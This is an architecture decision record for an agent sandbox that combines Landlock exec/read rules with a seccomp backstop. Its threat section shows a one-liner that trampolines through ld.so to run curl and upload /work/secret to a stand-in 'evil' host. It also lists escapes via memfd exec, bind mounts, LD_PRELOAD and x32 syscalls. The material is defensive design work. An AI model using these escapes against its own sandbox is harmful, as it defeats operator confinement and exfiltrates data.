# ADR 0011 — Landlock exec-axis co-confinement (the combined exec+read pass)

- Status: Proposed (2026-06-30)
- Date: 2026-06-30
- Context: `agent-bridle-core` `LandlockSandbox::apply()` requests **`fs_write` only**
  today (`AccessFs::from_write(ABI_FLOOR)`, `sandbox.rs:147`); reads and execute are
  deliberately left ungoverned so a dynamically-linked permitted binary can load its
  `.so`s (`sandbox.rs:118-125`). The live `exec` leash is therefore in-process and
  argv0-only: `ToolContext::check_exec(program)` (`context.rs:79`) consults the
  *effective* `exec` scope against the program token (and its basename,
  `context.rs:173-191`) at the single spawn chokepoint — it cannot see a permitted
  child's *own* `execve`/`open` once that child runs (the L3 interior-blindness gap,
  DESIGN §6 "no universal open-file hook" + the `exec`-builtin bypass; ADR 0001 L3).
  The per-axis report (#30, ADR 0004 D1) consequently hardcodes `exec → Interceptor`
  (`report.rs:113`) and the fail-closed predicate only covers `fs_write`
  (`confinement_unenforceable`, `spawn.rs:271-273`). #57 holds the `exec` frontier
  open. A prototype combined ruleset already exists on `issue-31/landlock-exec-axis`
  (adds `BASE_READ_PATHS`, `LOADER_PATHS`, `resolve_exec_paths`, and ORs
  `ReadFile|ReadDir` + `Execute` into one `restrict_self`); an adversarial sweep
  against it found that the naive combined pass **does not** close the loader
  trampoline and would report `exec → Kernel` dishonestly.
- **Extends ADR 0004** (un-holds D2's `exec` axis: turns the fail-closed gate from
  fs_write-only into an exec-aware one, and writes the precise condition under which
  `exec` may be reported `Kernel`). **Extends ADR 0001** (gives L3 a real `exec`/`read`
  ruleset, the layer L1/L2 cannot reach). **Governed by** ADR 0002 (the meet-semilattice
  + unforgeable `ToolContext`: the combined ruleset only ever *denies more*, so
  `effective ⊑ granted` is undisturbed) and **ADR 0009** (the sound *program-identity*
  close is Tier-2; this ADR is the Tier-1 increment).
- Related issues: **#57** (the held `exec` frontier — un-held here for the *boundary*,
  deferred to Tier-2 for *identity*), #31 (the un-stub gate / the prototype ruleset),
  #30 (the per-axis report this writes the `exec` arm of), #32 (derived strength — picks
  refuse-vs-advisory), #35 (Linux netns/seccomp — the sibling that brings the seccomp
  dep and the `net` axis), #58 / ADR 0010 (command packs — the L1 front-end that
  re-routes `find -exec` pre-spawn, belt-and-suspenders with this L3 backstop),
  DESIGN §6 (the verified threat model).

## Question

Landlock's `AccessFs::Execute` gates the `execve(2)` of a file under an allow-listed
path tree. The obvious way to un-hold #57 is to extend the one ruleset with an
`Execute` allow-list over the granted binaries plus the dynamic loader, so a permitted
program can no longer `execve` a *different*, un-granted tool (`find -exec curl`,
`awk 'system("curl …")'`). **Is that — an `Execute` allow-list co-confined with a
tight `fs_read` allow-list — sound enough to un-hold #57 and honestly report
`exec → Kernel`; and where it is not, what does the leash do instead so the un-stub
does not silently drop below today's fail-closed floor?**

The answer is **no, not at program-identity grain, and the prototype's `Kernel` claim
is false** — because of one structural fact about dynamic linking. This ADR names that
fact, ships the part of the mechanism that *is* sound (the filesystem **boundary**),
pairs it with a seccomp backstop for the syscalls Landlock cannot govern, and pins the
honesty posture so the un-hold raises the floor instead of lowering it.

## The threat: the loader/interpreter trampoline (read-as-code)

Name it precisely, because every wrong design here dies on it:

> **`ld.so` converts any `READ` right into an `EXECUTE` capability for any readable
> ELF.** Landlock's `Execute` right is checked only at `execve(2)` and at the kernel's
> internal `open_exec` of a program's `PT_INTERP` (the loader). It is **not** checked at
> `mmap(PROT_EXEC)` of an already-open `O_RDONLY` fd — Landlock has no `mmap` hook. So a
> permitted, execute-allow-listed loader can `open()`+`mmap()` *any file the `READ` axis
> allows* and jump to its entry point. The target ELF is **never `execve`'d** and need
> **never be on the `Execute` allow-list** — it arrives as data and runs as code.

Concretely, with `exec:Only{python3}`, `fs_read:Only{/work}` and the prototype's base
lists (`BASE_READ_PATHS` read-allows `/usr`,`/bin`,`/sbin`,`/lib*`; `LOADER_PATHS`
execute-allows `ld-linux-*.so`):

```
python3 -c 'import os; os.execv("/lib64/ld-linux-x86-64.so.2",
                               ["ld","/usr/bin/curl","-T","/work/secret","http://evil/"])'
#  execve(ld.so)          -> ALLOW  (loader is execute-allow-listed; it MUST be, for any dynamic binary)
#  ld.so open("/usr/bin/curl", O_RDONLY) -> ALLOW  (/usr is read-allow-listed; it MUST be, so libc loads)
#  ld.so mmap(...,PROT_EXEC)             -> UNGOVERNED (Landlock has no mmap hook) -> curl runs
```

`curl` was never in `exec:Only{python3}`. **The readable set equals the runnable set.**
Three corollaries, all empirically confirmed during the adversarial sweep, generalize it:

1. **`memfd`/`fexecve`/`/proc/self/fd`.** `memfd_create` + `execveat(fd,"",AT_EMPTY_PATH)`
   runs an arbitrary ELF: the memfd is an anonymous inode beneath no path rule, and
   Landlock does **not** deny exec of it (verified on Linux 6.8, Landlock ABI 4). A path
   `Execute` allow-list has nothing to match.
2. **`bind-mount` into the read tree.** A confined thread may `unshare(CLONE_NEWUSER|CLONE_NEWNS)`
   (no `uid_map` write needed) then `mount --bind /work/payload /usr/lib/os-release` and
   read/run the payload through the read-allowed `/usr` rule. Landlock has **no `mount`
   hook** in any released ABI (V1–V6).
3. **A granted interpreter/multitool is arbitrary in-domain code by definition.**
   `python -c`, `sh -c`, `perl -e`, and `busybox <applet>` run attacker logic *in
   process* with **no further `execve`** — the `Execute` list and `check_exec` (argv0-only)
   never see it.

The **invariant that survives** every one of these is the filesystem **boundary**: the
trampolined / `memfd`'d / forked code inherits the same Landlock domain (`restrict_self`
is inherited across `fork`/`execve`), so it **cannot exceed the granted `fs_read` /
`fs_write` extents**. What is lost is **binary identity** ("only `python3` ran"), not the
**fence extents**. That split is the spine of every decision below.

## Decision

Ship the combined ruleset for the **boundary** it soundly delivers; pair it with a
seccomp backstop for the syscalls Landlock cannot govern; and report `exec → Kernel`
**only** in the narrow, provably-closed configurations — defaulting to `Interceptor`
with a strong-principal **fail-closed** everywhere else. The combined pass introduces
**no new authority type, no new gate, no new mint site**: it tightens one existing
ruleset, so `effective = granted.meet(required) ⊑ granted` (`gate.rs:101`) and the
honesty rule (ADR 0004 D1) both hold by construction.

### D1 — Co-confine `exec`+`read`+`write` in **one** ruleset, on the spawn thread

One `Ruleset`, one `restrict_self()`, applied on the exact thread that spawns the
confined work, immediately before the spawn (the per-thread / irreversible /
inherited-across-`execve` contract, `sandbox.rs:127-130`; the `spawn.rs` throwaway-thread
pattern). Deltas vs the live `fs_write`-only `apply()` (`sandbox.rs:146-184`):

- **Handled rights.** `handled = from_write(ABI_FLOOR)` always; `|= (ReadFile|ReadDir)`
  when `fs_read` is `Only(_)`; `|= Execute` when `exec` is `Only(_)`. Use **pure
  `ReadFile|ReadDir`, never `from_read`** — `from_read` bundles `Execute`, which would
  make every readable directory executable.
- **Write rules** — unchanged: `path_beneath(write)` over `scope_roots(fs_write)`.
- **Read rules** (when `fs_read:Only`) — `path_beneath(ReadFile|ReadDir)` over
  `scope_roots(fs_read) ∪ BASE_READ_PATHS`, filtered to existing paths.
- **Execute rules** (when `exec:Only`) — `path_beneath(Execute)` over
  `resolve_exec_paths(exec) ∪ LOADER_PATHS`, filtered to existing paths.
- **Fail closed**: if `status.ruleset == RulesetStatus::NotEnforced`, return
  `ToolError::denied` (`sandbox.rs:177-181`). `landlock_is_supported()` probes under
  `HardRequirement` so an incapable kernel surfaces as `Err`, never silent best-effort.

`Execute` is attached to **loader and program FILES, never library/bin DIRECTORIES**.
`path_beneath` is recursive and `/lib → /usr/lib` is a merged-usr symlink, so allow-listing
any lib *directory* for `Execute` would make every ELF beneath `/usr/lib` runnable
(`/usr/lib/klibc/bin/sh`, busybox, `git-core`, `go`), defeating the axis. `.so` files are
`open(O_RDONLY)`+`mmap`'d, governed by the **read** axis, so `.so` dirs need `Read` but
**not** `Execute`. This is the security-critical narrowing carried over from
`issue-31`'s `LOADER_PATHS` doc and kept exactly.

### D2 — Boundary, not identity: state the guarantee honestly

The combined ruleset **soundly** guarantees, for the spawned program *and everything it
forks/`execve`s/trampolines into*: **no file outside the union of the execute-, read-,
and write-allow-listed extents is reached as code or data, and no write lands outside
`fs_write`.** That is a real kernel boundary, inherited by the interior, and strictly
stronger than today's `fs_write`-only floor (it closes `grep -f /etc/shadow`, confines a
trampolined `curl`'s reads/writes, and denies the *direct-execve* escapes — `find -exec
curl` as literally spelled, a payload `execve`'d out of the write-scratch dir, a
symlink-to-`sh`).

It does **not** guarantee **program identity** ("only the granted binaries ran"): per the
threat section, a readable ELF is a runnable ELF under any execute-allowed loader, and a
granted interpreter is arbitrary in-domain code. The leash therefore claims the boundary,
never the identity, for the general (dynamically-linked / interpreter) case.

### D3 — Narrow the read base-list and enforce W^X-for-code (`fs_read ∩ fs_write = ∅`)

`issue-31`'s `BASE_READ_PATHS` read-allows `/usr`,`/bin`,`/sbin` wholesale — the entire
program corpus — which is what makes the readable set the runnable set. Narrow it:
**library/loader trees and the *specific* runtime files only**, never the program
directories: `/lib`,`/lib64`,`/lib32`,`/libx32`,`/usr/lib`,`/usr/lib64` (the `.so`
trees), the loader cache and resolver config (`/etc/ld.so.cache`, `/etc/ld.so.preload`,
`/etc/nsswitch.conf`, `/etc/resolv.conf`, `/etc/localtime`, `/etc/alternatives`),
`/proc/self`, the `/dev` essentials, and locale — plus the resolved granted-program
*files* (so a granted binary is readable for its own load) and the `fs_read` grant.
`/etc` is never granted wholesale, so `/etc/shadow` stays denied. (Narrowing reads is
**necessary but not sufficient**: ELFs still live under `/usr/lib`, so the loader can
trampoline to them — this only shrinks the corpus, it does not close the axis; see D7.)

Separately, **refuse any configuration where a path is both writable and loader-readable**
(`fs_read ∩ fs_write ≠ ∅` for code-bearing paths). A file the principal can write *and*
`mmap` as code is a W^X violation that re-opens the trampoline with an attacker-authored
payload (`echo … > /work/p.py; python /work/p.py`; a planted `LD_PRELOAD=.so`). This is
the only W^X the lattice can express, and it is required before `exec` may approach
`Kernel` (D7).

### D4 — Pair Landlock with a seccomp backstop for the syscalls it cannot govern

Landlock cannot govern `mmap(PROT_EXEC)`, anonymous-inode exec, or the mount/namespace
family. A feature-gated **seccomp-BPF** filter (`linux-seccomp`, optional `seccompiler`
dep under `[target.'cfg(target_os="linux")'.dependencies]`, mirroring the `landlock`
wiring so core stays `#![forbid(unsafe_code)]`; the `unsafe` is internal to the dep)
installed on the **same spawn thread, before spawn**, supplies two things Landlock cannot:

1. **The `exec:none` hard floor** — deny `execve` **and** `execveat` (the latter covers
   `fexecve`/`memfd`/`/proc/self/exe`). This is the path-blind "this thread and everything
   it forks may exec nothing further" guarantee that no path allow-list can express.
2. **Close the bind-mount escape** — deny the namespace/mount family: `mount`,
   `move_mount`, `open_tree`, `fsopen`/`fsconfig`/`fsmount`, `mount_setattr`, `pivot_root`,
   `chroot`, `setns`, and `clone`/`clone3`/`unshare` with `CLONE_NEWUSER|CLONE_NEWNS`. This
   removes the attacker's ability to re-point the read allow-list at a forbidden inode.

The seccomp filter **must default-DENY on an unexpected `seccomp_data.arch`** (validate
`arch == ` the single native `AUDIT_ARCH_*` and `KILL_PROCESS` otherwise) and **mask
`__X32_SYSCALL_BIT`** — a default-`ALLOW` + native-number-only deny is bypassed by an
i386 `int $0x80` or an x32 `execve` (verified: `CONFIG_IA32_EMULATION` is on by default).
Seccomp and Landlock are independent, both per-thread, both inherited across `execve`,
both require `PR_SET_NO_NEW_PRIVS`; a `CompositeSandbox` applies both at the one
`apply()` site (apply Landlock's `restrict_self()` first so `NO_NEW_PRIVS` is set, or set
it explicitly for the seccomp-only path). seccomp does **not** do path-granular exec
(cBPF cannot deref the filename pointer) — that stays Landlock-`Execute`'s job; the two
divide labor, they do not overlap. `vm.memfd_noexec=2` / `MFD_NOEXEC_SEAL` are
recommended host defense-in-depth.

### D5 — Canonicalize the exec target; `exec` grant ∩ `fs_write = ∅`; scrub the env

`check_exec` matches a raw string or basename and does **no** canonicalization
(`context.rs:173-191`), so a payload written to `/work/git` (basename collides with an
`exec:Only{git}` grant) passes admission and the kernel runs it — the `Execute` rule even
allows it if `/work` is execute-reachable. Close the matcher:

- **Canonicalize the exec target before matching**, exactly as `check_path` already does
  (resolve symlinks, reject `..`, resolve bare names through a *fixed trusted* PATH), and
  match on the resolved absolute **file**, never a raw string and never a bare basename
  for a security pin.
- **Refuse to execute any file inside (or reachable through a writable component of) the
  `fs_write` scope** — a binary the principal can overwrite or co-locate is not a
  trustworthy pin. (Pin to content/hash or to read-only/system mounts when identity
  matters.) This is the `exec ∩ write = ∅` companion to D3's `read ∩ write = ∅`.
- **`env_clear()` before spawn** (already done by the subprocess primitive,
  `spawn.rs:199`; the shell `run_pipeline` must do the same) **and denylist
  loader/interpreter control vars** at admission and in the child env-allow filter:
  `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `PYTHONPATH`, `PERL5LIB`, `NODE_OPTIONS`,
  `BASH_ENV`, `PYTHONSTARTUP`, and `GIT_*` hook vars. `NO_NEW_PRIVS` does **not** disable
  `LD_PRELOAD` on a non-setuid binary, so scrubbing is mandatory, not incidental.

### D6 — A granted interpreter/multitool is `exec ≡ All` for honesty

Granting `sh`, `bash`, `dash`, `python*`, `perl`, `ruby`, `node`, `lua`, `awk`, `env`,
`make`, `busybox`, `toybox`, or `ld.so` under a restricted `exec` axis can **never** be
reported `Kernel`: such a binary runs arbitrary code in-process (no `execve` for the
`Execute` list to see) and can trampoline through the loader to any readable ELF. Per
ADR 0004 D3, **`code` is the strictest preset, not the loosest** — granting an interpreter
is the highest-authority `exec` choice, and the report must reflect that (`exec →
Interceptor`, strong principal refuses), never imply the interpreter's interior is
confined. Detection is a denylist + a heuristic (a binary that `dlopen`/`ctypes`-loads is
undecidable to detect in general), so the rule is conservative: an *unrecognized* granted
binary is treated as potentially-interpreting and does **not** earn `Kernel`.

### D7 — Honesty posture: when `exec` may be reported `Kernel`

The `report.rs` `exec` arm (today `is_restricted(exec).then_some(Interceptor)`,
`report.rs:113`) becomes a function of the *active backends* and the *config*, kept
compile-exhaustive over `SandboxKind` so a new backend must decide its mapping
(`report.rs:97-98`) and the `noop_host_never_reports_kernel` oracle (`report.rs:173-186`)
still holds. `exec` is reported **`Kernel` only when ALL of**:

1. a kernel `exec` backstop is **actually in force** (Landlock `Execute` ruleset applied,
   or the seccomp `exec:none` filter installed), **and**
2. `exec` is restricted (`Only(_)`), **and**
3. `fs_read` is restricted (`Only(_)`) — co-confinement engaged (ambient reads ⇒
   trampoline wide open), **and**
4. `fs_read ∩ fs_write = ∅` for code paths and the env is scrubbed (D3/D5), **and the
   namespace/mount seccomp deny is installed** (D4 — else bind-mount re-opens it), **and**
5. **either** (a) `exec` is empty (`exec:none`) with the seccomp `execve`+`execveat` deny
   installed — the no-further-exec floor; **or** (b) the granted program set is
   statically-linked-only, contains **no** interpreter/multitool (D6), **and**
   `LOADER_PATHS` is dropped from the `Execute` set (no execute-allowed loader ⇒
   `execve(ld.so)` is `EACCES` ⇒ no trampoline) — the program-identity floor.

In **every other** restricted-`exec` configuration — i.e. the common dynamically-linked
grant and any interpreter grant — `exec` is reported **`Interceptor`** (admission-grade
argv0 check; the fs boundary still confines effects per D2). `exec → Kernel` is **never**
emitted for `exec:Only` while `LOADER_PATHS` is execute-allowed and any ELF tree is
read-allowed, because by D2's own definition a non-allow-listed file *is* reached as code
there. The coarse `sandbox_kind` stays the **minimum** claim
(`effective_sandbox_kind` downgrade, `sandbox.rs:123`); it never describes the `exec`
axis as confined when the per-axis report marks it `Interceptor`.

### D8 — Un-hold #57: a strong principal FAILS CLOSED when `exec` is not `Kernel`

"Un-holding #57" means **the gate stops leaving `exec` ambient.** Extend the fail-closed
predicate (`confinement_unenforceable`, today `kind==None && fs_write:Only`,
`spawn.rs:271-273`) so that, for a restricted `exec` axis whose `enforcement_report(...).exec
!= Kernel`:

- **strong** strength ⇒ **refuse the invocation** at the spawn/admission site (where the
  `fs_write` fail-closed already fires), **before** spawning. This preserves the pre-#31
  stub floor that denied `find -exec curl`; a naive un-stub that runs it under
  `fs_write`-only Landlock is the silent floor-drop ADR 0004 D2 forbids.
- **weak / wrapper-only** strength ⇒ permit, but report `exec` truthfully as `Interceptor`
  in the envelope. Strength (derived per ADR 0004 D3 / #32) selects only the
  **refuse-vs-advisory disposition**; it can never manufacture a `Kernel` claim. The
  symmetric rule applies to a restricted `net` axis (always `Advisory` here — this ADR
  does not touch `net`; #35).

This is the operational difference from today: a strong principal with `exec:Only{git}`
no longer runs ambient under a write-only ruleset — it gets the combined boundary and an
honest `Interceptor`, and if the embedder demanded `Kernel`-grade `exec` it is refused
and routed to Tier-2 (D9).

### D9 — Sound program-identity is Tier-2 (defer to ADR 0009)

The only general close of **binary identity** for dynamically-linked / interpreter grants
is the one ADR 0009 D2 already names: a **micro-VM / mount-namespace rootfs** containing
only the granted binaries, their exact `.so` deps, and the loader — so the read-allowed
tree *physically* contains no `curl`/`sh`/`python` to trampoline into. This ADR is the
**Tier-1** increment: it closes the fs boundary at kernel grain and the direct-execve
escapes, and it makes the leash *honest* about identity rather than claiming it. The
identity guarantee for arbitrary toolchains is #57's Tier-2 follow-up, not this PR.

### D10 — Kernel floor, degradation, and the CI proof gate

`AccessFs::Execute`, `ReadFile`, and `ReadDir` all exist at Landlock **ABI V1 (Linux
5.13)**, so the existing `ABI_FLOOR = ABI::V3` request run `BestEffort` (`sandbox.rs:100,165`)
already covers them — on 5.13–5.18 the exec/read rights still apply (only V3-only rights
like `Truncate` degrade). seccomp-BPF (`SECCOMP_MODE_FILTER`) is **Linux 3.5**, wider than
Landlock; `execveat` deny matters from 3.19. Both require `PR_SET_NO_NEW_PRIVS`, are
per-thread, and inherited across `execve`. Off-Linux, without the feature, or on an
incapable kernel, the honest result is `SandboxKind::None` (advisory) and a strong
principal fails closed on any restricted `exec` (D8). CI keeps `BRIDLE_REQUIRE_LANDLOCK`
(`skip_proof_unless_landlock` *panics* if the flag is set but the kernel lacks Landlock,
`sandbox.rs:855-873`) and adds a `BRIDLE_REQUIRE_SECCOMP` twin. The adversarial escape
sweep (`exec_escape_attempts_are_all_denied`, `issue-31` `sandbox.rs:696`) must be
extended — it currently grants `exec:Only{cat}` (a non-interpreter that never invokes the
loader) with `fs_read:All`, so it sits *beside* the live hole — to add, under the coupled
`exec:Only ∧ fs_read:Only` config: **loader-direct** (`/lib64/ld-linux-*.so TARGET`,
`find -exec ld.so TARGET`), **memfd/fexecve** (`execveat(memfd,…,AT_EMPTY_PATH)`),
**bind-mount** (`unshare`+`mount --bind` into the read tree), **LD_PRELOAD**, and
**cross-ABI** (`-m32` / x32 `execve`). Each must assert *either* kernel denial (where D4
closes it) *or* an honest non-`Kernel` report (where D7 declares it unenforced) — never a
green test next to a silent run.

## Bypass vectors and their disposition

| Vector | Disposition |
|---|---|
| `find -exec curl` (direct child `execve`) | **Closed** by the `Execute` allow-list (`execve(curl)` → `EACCES`); also caught pre-spawn + structured by the ADR 0010 L1 pack (belt-and-suspenders). |
| Payload `execve`'d out of the write-scratch dir; symlink/shebang to `sh` | **Closed** — scratch is write-not-execute; `Execute` resolves to the real (un-granted) inode. |
| `grep -f /etc/shadow` / read-injection | **Closed** by the read allow-list (`/etc` not granted wholesale). |
| **Loader trampoline** (`ld.so /usr/lib/<elf>`, `python -c 'execv(ld.so,…)'`) | **NOT closed** by Landlock (read-as-code, no `mmap` hook). **Honestly declared `Interceptor`** (D2/D7); strong principal **fails closed** (D8); fs boundary still holds; sound close is static-only+drop-loader (D7) or Tier-2 (D9). |
| `memfd`/`fexecve`/`execveat`/`/proc/self/fd` | **Closed at syscall grain for `exec:none`** by the seccomp `execve`+`execveat` deny (D4, arch-guarded); for `exec:Only{set}` not reachable without exploiting the granted binary, and for a granted **interpreter** identity is gone — declared `Interceptor`. Boundary always holds. |
| `bind-mount` / userns re-point into the read tree | **Closed** by the seccomp namespace/mount deny (D4); until that backstop is in force `exec` is **not** `Kernel` (D7). |
| `LD_PRELOAD` / `LD_LIBRARY_PATH` / `LD_AUDIT` | **Closed** by `env_clear` + the interpreter-env denylist (D5) and `read ∩ write = ∅` (D3). |
| Path-games (basename collision in `fs_write`, writable-grant overwrite, PATH-shadow) | **Closed** by canonicalizing the exec target + `exec ∩ fs_write = ∅` + `env_clear PATH` (D5). |
| `busybox`/`python`/`sh` multitool (no further `execve`) | **Not enforceable** — declared `exec ≡ All` for honesty (D6); strong principal fails closed. |
| Cross-ABI (`i386`/`x32`) syscall to dodge the seccomp deny | **Closed** by default-DENY on unexpected `seccomp_data.arch` + `__X32_SYSCALL_BIT` masking (D4); CI proves cross-ABI denial (D10). |
| Kernel-floor downgrade (no Landlock / old kernel) | **Fails closed** — `landlock_is_supported()` `HardRequirement` probe ⇒ `SandboxKind::None` ⇒ strong principal refuses restricted `exec` (D8/D10). |

## Consequences

**Positive**

- The fs **read/write boundary** for a permitted program's *interior* becomes
  kernel-enforced and inherited across the trampoline — strictly stronger than today's
  `fs_write`-only floor; `grep -f /etc/shadow` and a trampolined `curl`'s reads/writes are
  confined to the granted extents regardless of which binary ends up running.
- The **direct-execve** escape family (`find -exec curl`, write-scratch payload,
  symlink/shebang) is closed at the kernel `execve` boundary, backstopping `check_exec`'s
  argv0 blindness (the ADR 0001 L3 gap) and composing belt-and-suspenders with the
  ADR 0010 L1 packs.
- #57 is **un-held honestly**: the gate stops leaving `exec` ambient — a strong principal
  is either kernel-confined or refused, never silently advisory — without the dishonest
  `exec → Kernel` claim that would have laundered the trampoline into permission.
- One ruleset, one `restrict_self`, same `SandboxKind::Landlock`, same call site — no new
  trust root, no new mint site; the `meet` law is undisturbed (the combined set only ever
  denies more).

**Negative / risks**

- **Program identity is not kernel-pinned** for dynamically-linked / interpreter grants;
  that guarantee is deferred to Tier-2 (ADR 0009 D2 / D9). Reviewers must not read
  `exec → Interceptor` + a Landlock boundary as "identity confined."
- **A second kernel mechanism (seccomp)** to keep honest, including the arch-guard and a
  cross-ABI CI proof; a Landlock+seccomp composite does not map to one `SandboxKind`
  cleanly (likely an `ActiveBackends` set feeding the report — tracked, not decided here).
- **`BASE_READ_PATHS` is FHS/glibc-tuned**; an under-populated list on musl/Nix/non-FHS is
  a deny-of-function (a granted binary can't load libc), not a safety failure — but it
  still needs a CI matrix or a runtime canary that a canonical dynamic binary loads under
  read-confinement before the host claims the axis.
- **The `net` axis is untouched** — a granted dynamic binary can still `connect()` out; a
  strong principal with `net:Only` still fails closed (#35).

## Options considered and rejected

- **Pure Landlock `Execute` allow-list reporting `exec → Kernel` at identity grain** (the
  `issue-31` prototype's claim) — rejected: the loader trampoline + `memfd` + bind-mount
  make "only the granted binaries ran" provably false whenever the loader is
  execute-allowed and any ELF tree is read-allowed (both mandatory for dynamic linking).
  Reporting `Kernel` there violates ADR 0004 D1 and converts the fail-closed gate into a
  fail-**open** (the false claim satisfies "report == Kernel ⇒ run"). We keep the
  mechanism for the **boundary**, not the identity.
- **Wide `BASE_READ_PATHS`** (`/usr`,`/bin`,`/sbin` wholesale, as prototyped) — rejected
  (D3): read-allowing the program corpus makes the readable set the runnable set. Narrowed
  to library/loader trees + specific files + granted-program files.
- **`AccessFs::from_read` for the read axis** — rejected: it bundles `Execute`, making
  every readable directory executable. Pure `ReadFile|ReadDir` only.
- **`Execute` on library/bin directories** — rejected: `path_beneath` is recursive and
  `/lib → /usr/lib` is merged-usr, so a lib-dir `Execute` grant exposes every reachable
  interpreter under `/usr/lib`. Loader/program **files** only.
- **Path-granular exec via seccomp `SECCOMP_RET_USER_NOTIF` + an external supervisor that
  derefs the `execve` filename** — rejected for now: heavy, TOCTOU-prone, and a new
  privileged supervisor process; Landlock-`Execute` already does path-granular allow-listing
  at the LSM hook (arch-independent). seccomp is kept for the path-blind `exec:none` floor
  and the namespace/mount deny only.
- **Command packs (ADR 0010 / L1) as the `exec` close** — rejected as *the* close: pure
  userspace argv inspection adds zero kernel guarantee and cannot move `exec` to `Kernel`;
  it cannot see a child's interior `execve`/reads, an interpreter's data-payload, or a
  trampoline. Kept as the **pre-spawn, structured, legible** front-end that composes with
  this L3 backstop (ADR 0010 D10's refuse-if-no-Landlock).
- **Un-stub with `fs_write`-only Landlock and run a restricted `exec` ambient** — rejected
  (ADR 0004 D2): silently drops the operative `exec` floor below the fail-closed stub
  (`find -exec curl` would run because only the write it never makes was Landlocked).
- **Claiming Tier-2 program identity in this ADR** — rejected (D9): the micro-VM/namespace
  rootfs that physically excludes un-granted binaries is the sound identity close and
  belongs to ADR 0009 / #57's Tier-2 track, not this Tier-1 increment.

## Follow-ups (tracking issues)

- **#57** — the `exec` frontier: un-held here for the *boundary*; Tier-2 *identity* close
  remains open (D9 / ADR 0009 D2).
- **#31** — land the combined ruleset (D1/D3) + the un-hold fail-closed gate (D8) + the
  honest report arm (D7); extend the adversarial sweep (D10).
- **#35** — the `linux-seccomp` feature/dep (D4: the `exec:none` floor + the
  namespace/mount deny + the arch guard) and the `net` axis.
- **#30 / #32** — the `exec` report arm (D7) and the derived strength that picks
  refuse-vs-advisory (D8).
